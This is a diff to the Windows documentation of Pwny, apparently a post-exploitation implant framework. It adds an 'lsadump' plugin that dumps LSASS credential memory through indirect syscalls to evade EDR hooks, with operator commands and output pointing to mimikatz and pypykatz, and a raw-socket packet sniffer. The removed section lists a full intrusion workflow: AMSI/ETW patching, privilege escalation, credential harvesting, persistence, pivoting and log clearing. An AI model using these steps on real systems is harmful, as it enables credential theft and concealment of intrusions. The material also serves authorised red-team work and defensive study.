@@ -1,6 +1,6 @@
 # Windows — Pwny Documentation
 
-This section covers everything specific to running Pwny on **Windows** targets: platform-specific commands, the extensive plugin library (25+ plugins), building, evasion, and post-exploitation workflows.
+This section covers everything specific to running Pwny on **Windows** targets: platform-specific commands, the extensive plugin library (28 plugins), building, evasion, and post-exploitation workflows.
 
 ---
 
@@ -16,6 +16,7 @@ This section covers everything specific to running Pwny on **Windows** targets: 
   - [Process & Injection](#process--injection)
   - [System Reconnaissance](#system-reconnaissance)
   - [Lateral Movement](#lateral-movement)
+  - [Network Capture](#network-capture)
   - [Media Capture](#media-capture)
   - [Execution](#execution)
   - [Forensic Manipulation](#forensic-manipulation)
@@ -80,6 +81,8 @@ After loading, run `help` to see the new commands.
 | **eventlog** | `clearev` | Forensic |
 | **timestomp** | `timestomp` | Forensic |
 | **minidump** | `minidump` | Credentials |
+| **lsadump** | `lsadump` | Credentials |
+| **sniffer** | `sniffer` | Network |
 
 ---
 
@@ -389,6 +392,34 @@ pwny:/$ minidump 648 -r C:\Windows\Temp\dump.dmp
 
 ---
 
+#### `lsadump` — Stealthy LSASS Memory Dump
+
+Dump LSASS process memory using indirect syscalls. Unlike `minidump`, this plugin avoids standard API calls that EDRs hook (`OpenProcess`, `ReadProcessMemory`) by dispatching through raw `syscall` instructions extracted from ntdll stubs.
+
+```
+pwny:/$ load lsadump
+```
+
+```
+pwny:/$ lsadump -o /tmp/lsass.dmp
+[*] Resolving syscall stubs from ntdll.dll...
+[*] Locating lsass.exe...
+[*] Reading LSASS memory via indirect syscalls...
+[+] LSASS dump saved to /tmp/lsass.dmp (42516480 bytes)
+[i] Use pypykatz to extract credentials:
+[i]   pypykatz lsa minidump /tmp/lsass.dmp
+```
+
+**Key features:**
+- Indirect syscalls via ntdll stub trampolines (bypasses userland hooks)
+- No `OpenProcess` / `NtReadVirtualMemory` in the IAT
+- Graceful failure under Wine (detects `wine_*` exports in ntdll)
+- Requires SYSTEM or SeDebugPrivilege
+
+> **Note:** This plugin uses the same dump format as `minidump`, so the output can be processed with mimikatz, pypykatz, or secretsdump.py.
+
+---
+
 ### Persistence
 
 #### `persist` — Persistence Mechanisms
@@ -654,6 +685,71 @@ ARP Table
  192.168.1.100    aa:bb:cc:dd:ee:ff  Dynamic  3
  224.0.0.22       01:00:5e:00:00:16  Static   3
 ```
+
+---
+
+### Network Capture
+
+#### `sniffer` — Raw Socket Packet Capture
+
+Capture network packets using Windows raw sockets with `SIO_RCVALL` (promiscuous mode). Packets are buffered in a ring buffer and can be dumped to standard PCAP format for analysis in Wireshark or tcpdump.
+
+```
+pwny:/$ load sniffer
+```
+
+**List network interfaces:**
+```
+pwny:/$ sniffer -l
+[*] Querying network interfaces...
+
+Network Interfaces
+==================
+
+ Index  IP Address       Netmask
+ -----  ----------       -------
+ 3      192.168.1.50     255.255.255.0
+ 1      127.0.0.1        255.0.0.0
+```
+
+**Start a capture:**
+```
+pwny:/$ sniffer -s 192.168.1.50
+[*] Starting capture on 192.168.1.50...
+[+] Capturing on 192.168.1.50.
+```
+
+**List active captures:**
+```
+pwny:/$ sniffer -L
+Active Captures
+===============
+
+ Interface       Packets  Bytes
+ ---------       -------  -----
+ 192.168.1.50    1247     892160
+```
+
+**Dump captured packets to PCAP:**
+```
+pwny:/$ sniffer -d 192.168.1.50 -o /tmp/capture.pcap
+[+] Dumped 1247 packets to /tmp/capture.pcap
+```
+
+**Stop a capture:**
+```
+pwny:/$ sniffer -c 192.168.1.50
+[*] Stopping capture on 192.168.1.50...
+[+] Stopped. 1247 packets captured (892160 bytes).
+```
+
+**Capture a fixed number of packets:**
+```
+pwny:/$ sniffer -s 192.168.1.50 -n 100
+[+] Capturing up to 100 packets on 192.168.1.50.
+```
+
+> **Note:** Requires administrator privileges. Windows raw sockets deliver IP-layer frames (no Ethernet header). The PCAP output uses `DLT_RAW` (link type 101), which Wireshark handles natively.
 
 ---
 
@@ -1097,7 +1193,7 @@ The Windows build includes additional targets:
 
 ## COT on Windows
 
-All 26 Windows plugins are built as COT (Code-Only Tabs). During the CMake build:
+All 28 Windows plugins are built as COT (Code-Only Tabs). During the CMake build:
 
 1. Each plugin is compiled as a DLL
 2. `pe2cot.py` strips the PE into a raw code blob
@@ -1113,50 +1209,6 @@ See [COT Documentation](../cot.md) for the full technical deep-dive.
 2. Add `myplugin` to the `COT_PLUGINS` list in `CMakeLists.txt`
 3. Create `pwny/plugins/windows/myplugin.py` with Python wrapper
 4. Build with `-DPLUGINS=ON`
-
----
-
-## Typical Windows Post-Exploitation Workflow
-
-```
-1. Catch session
-   └─ pwny console opens, MOTD shows sysinfo
-
-2. Situational awareness
-   ├─ sysinfo          → OS version, arch, memory
-   ├─ whoami / getuid  → current user / impersonated user
-   ├─ ps               → running processes
-   └─ load services    → AV/EDR detection
-
-3. Evasion
-   ├─ load evasion
-   ├─ evasion --all    → patch AMSI + ETW
-   └─ evasion --unhook-ntdll  → remove EDR hooks
-
-4. Privilege escalation
-   ├─ load uac → check integrity level
-   ├─ load getsystem → elevate to SYSTEM
-   └─ load token → steal_token from SYSTEM process
-
-5. Credential harvesting
-   ├─ load credentials → hashdump, lsa_secrets
-   ├─ load credstore   → credential manager
-   ├─ load kerberos    → klist, kdump
-   └─ load wifi_passwords → WiFi profiles
-
-6. Persistence
-   ├─ load persist → reg_hkcu, schtask, service
-   └─ load schtasks → fine-grained task management
-
-7. Lateral movement
-   ├─ portfwd         → tunnel to internal hosts
-   ├─ socks           → SOCKS5 proxy
-   └─ load smb_pipe   → named pipe C2
-
-8. Cleanup
-   ├─ load eventlog → clearev
-   └─ load timestomp → fix file timestamps
-```
 
 ---
 
